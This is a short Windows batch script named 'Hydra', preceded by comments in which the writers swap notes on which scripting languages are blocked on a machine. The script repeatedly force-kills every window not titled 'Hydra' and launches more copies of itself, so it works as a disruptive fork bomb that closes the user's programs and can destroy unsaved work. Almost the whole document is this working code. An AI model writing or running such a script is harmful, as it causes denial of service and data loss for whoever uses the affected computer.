@ECHO OFF
::Powershell isn't blocked. Also, we have D and C++. XD
::What do you mean? I still have JScript!
::Is ps blocked, or possible?
::How did you get batch blocked? (And D and C++ goto exe, which is very suspicious, JScript is .js, which looks like normal javascript.
::There is a way to check for comparisons, just not using < and >, since they are redirect chars
TITLE Hydra 
set n=0
:begin
set /a n+=1
Findstr /m "%n%" data.txt
if %errorlevel%==0 (
goto :begin
) ELSE (
goto :loop
)
:loop 
FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/c "exe"`) DO (
SET windowcount=%%F
)
TASKKILL /F /FI "WINDOWTITLE ne Hydra"
IF "%windowcount%"=="%n%" (
START Hydra.bat
START Hydra.bat
set /a n+=1
Echo %n% > data.txt
)
GOTO :loop
